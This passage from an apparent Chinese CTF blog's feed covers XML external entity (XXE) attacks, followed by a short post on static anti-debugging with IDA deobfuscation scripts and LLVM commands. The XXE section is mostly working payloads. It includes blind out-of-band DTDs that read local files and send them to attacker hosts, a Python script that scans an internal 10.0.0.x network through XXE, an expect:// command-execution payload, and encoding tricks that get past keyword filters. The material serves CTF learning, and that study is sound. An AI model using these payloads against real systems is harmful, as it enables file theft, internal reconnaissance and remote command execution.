class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>文件含特殊字符</strong>（参数实体）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="无回显-Blind-OOB-XXE"><a href="#无回显-Blind-OOB-XXE" class="headerlink" title="无回显 (Blind OOB XXE)"></a>无回显 (Blind OOB XXE)</h3><ul><li><p><strong>常规</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>支持的协议：</p><p>PHP:</p><p>file http ftp php compress.zlib compress.bzip2 data glob phar</p><p>Java:</p><p>http https ftp file jar netdoc mailto gopher</p></li></ul><p>​    </p><h3 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h3><ul><li><p><strong>HTTP内网主机探测</strong></p><p>利用 file 协议读取作为支点服务器的网络配置文件，看有没有内网，以及网段大概是什么样子，可以尝试读取 <code>/etc/network/interfaces</code> 或者 <code>/proc/net/arp</code> 或者 <code>/etc/host</code> 文件，就有大致的探测方向。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span>(<span class="params">string</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span>(<span class="params">xml</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="built_in">print</span>(coded_string)</span><br><span class="line"><span class="comment">#   print(base64.b64decode(coded_string))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = <span class="built_in">str</span>(i)</span><br><span class="line">        ip = <span class="string">&#x27;10.0.0.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(string)</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></li><li><p><strong>HTTP内网主机端口扫描</strong></p><p>找到内网一台主机，想要知道攻击点在哪，还需要进行端口扫描，端口扫描的脚本与主机探测类似，只要把IP地址固定，然后循环遍历端口，当然一般端口是通过响应的时间的长短判断该该端口是否开放的。除了这种方法，我们还能结合 burpsuite 进行端口探测。</p></li><li><p><strong>RCE</strong></p><p>主要是由于配置不当/开发内部应用导致的。如果足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [ <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="绕过（bypass）"><a href="#绕过（bypass）" class="headerlink" title="绕过（bypass）"></a>绕过（bypass）</h3><ul><li><p><strong>协议（如http）</strong></p><p>可以利用实体编码绕过。</p><ul><li><p>双重实体编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">xml</span> <span class="meta-string">&quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %xml;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag.txt&quot;</span> &gt;</span>]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">core</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>data://协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>file://协议+文件上传</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>php://filter协议+文件上传</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">hhh</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>关键词（如 ENTITY, SYSTEM, file）</strong></p><p>使用编码方式绕过：UTF-16BE</p><p><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://yourVPS/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url, data=payload)</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://42.192.137.212/index.php?q=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/8041#toc-6">从几道CTF题学习Blind XXE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;XML是一种非常流行的标记语言，用于配置文件。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="web" scheme="https://lazzzaro.github.io/categories/web/"/>
    
    
    <category term="XXE" scheme="https://lazzzaro.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>静态反调试</title>
    <link href="https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/</id>
    <published>2021-02-24T14:23:51.000Z</published>
    <updated>2022-03-19T16:10:57.422Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。</p><p>（待补充）</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/5685">https://xz.aliyun.com/t/5685</a></p><p><a href="https://xz.aliyun.com/t/5732/">https://xz.aliyun.com/t/5732/</a></p><p><a href="https://xz.aliyun.com/t/6133">https://xz.aliyun.com/t/6133</a></p><hr><h3 id="栈指针平衡"><a href="#栈指针平衡" class="headerlink" title="栈指针平衡"></a>栈指针平衡</h3><p>​    </p><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h3><p>去花：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>(<span class="params">addr,endaddr</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(addr&lt;endaddr):</span><br><span class="line">        PatchByte(addr,<span class="number">0x90</span>)</span><br><span class="line">        addr+=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undefine</span>(<span class="params">addr,endaddr</span>):</span></span><br><span class="line">    <span class="keyword">while</span> addr&lt;endaddr:</span><br><span class="line">        MakeUnkn(addr,<span class="number">0</span>)</span><br><span class="line">        addr+=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dejunkcode</span>(<span class="params">addr,endaddr</span>):</span></span><br><span class="line">    <span class="keyword">while</span> addr&lt;endaddr:</span><br><span class="line">        MakeCode(addr)</span><br><span class="line">        <span class="comment"># 匹配模版</span></span><br><span class="line">        <span class="keyword">if</span> Byte(addr)==<span class="number">0xe8</span> <span class="keyword">and</span> Byte(addr+<span class="number">6</span>)==<span class="number">0x12</span> <span class="keyword">and</span> Byte(addr+<span class="number">7</span>)==<span class="number">0x83</span>:</span><br><span class="line">            <span class="built_in">next</span>=addr+<span class="number">10</span></span><br><span class="line">            nop(addr,<span class="built_in">next</span>)</span><br><span class="line">            addr=<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        addr+=ItemSize(addr)</span><br><span class="line">dejunkcode(<span class="number">0x00401000</span>,<span class="number">0x00411E40</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><p>SMC（自修改代码，Self-Modifying Code），就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。</p><p><strong>还原方法</strong></p><ol><li>首先确定需要加密的代码部分；</li><li>通过vs查看反汇编（或者OD、IDA等）可以确定对应部分的反汇编代码；</li><li>将这段代码手工用16进制编辑器覆盖为加密后的数据；</li><li>程序执行时则运行事先写好的代码先进行解密再运行。</li></ol><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/qq_41923479/article/details/80377708">https://blog.csdn.net/qq_41923479/article/details/80377708</a><br><a href="https://blog.csdn.net/palmer9/article/details/105034093">https://blog.csdn.net/palmer9/article/details/105034093</a></p><p><strong>脚本</strong></p><p>IDA - File - Script file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401216</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">0x43E</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^Byte(<span class="number">0x00409080</span>+i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MOV混淆"><a href="#MOV混淆" class="headerlink" title="MOV混淆"></a>MOV混淆</h3><p>​    </p><h3 id="OLLVM混淆（LLVM）"><a href="#OLLVM混淆（LLVM）" class="headerlink" title="OLLVM混淆（LLVM）"></a>OLLVM混淆（LLVM）</h3><ol><li><p>基于<code>SnowGirls</code>的<a href="https://github.com/SnowGirls/deflat">deflat</a>，利用<a href="https://github.com/angr/angr">angr</a>框架实现去除控制流平坦化。</p><p><code>python deflat.py -f check_passwd_x8664_flat --addr 0x400530</code></p></li><li><p>LLVM多种格式</p><p>xx.c （源代码）</p><p>xx.ll （LLVM字节码的文本表示）</p><p>xx.s （机器汇编码表示的汇编文件）</p><p>xx.bc （LLVM字节码的二进制形式）</p><p>xx.out （可执行的二进制文件）</p><p><img src="https://img-blog.csdnimg.cn/20210428135001768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMzA4NzQx,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;"></p></li></ol><p>   常用转换：</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clang test.bc -o <span class="built_in">test</span></span><br><span class="line">llvm-dis test.bc -o test.ll</span><br><span class="line">llvm-as test.ll -o test.bc</span><br><span class="line">llc test.bc -o test.s</span><br><span class="line">lli test.bc</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。&lt;/p&gt;
&lt;p&gt;（待补充）&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a hr</summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="反调试" scheme="https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
</feed>
